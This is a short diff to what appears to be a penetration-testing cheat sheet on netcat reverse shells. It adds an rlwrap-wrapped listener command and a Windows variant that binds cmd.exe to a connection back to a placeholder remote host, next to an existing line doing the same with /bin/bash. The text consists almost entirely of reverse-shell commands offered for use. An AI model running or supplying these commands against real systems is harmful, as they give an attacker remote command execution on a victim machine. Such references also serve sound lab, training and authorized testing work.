@@ -6,6 +6,10 @@
 nc -nlvp <LPORT>
 ```
 
+```
+rlwrap nc -nlvp <LPORT>
+```
+
 ## Connect
 
 ```
@@ -17,6 +21,9 @@ Use `-e` to link the connection to a program
 nc -e /bin/bash <RHOST> <RPORT>
 ```
 
+```
+nc -e cmd.exe <RHOST> <RPORT>
+```
 
 ## Stabilize Reverse Shell
 
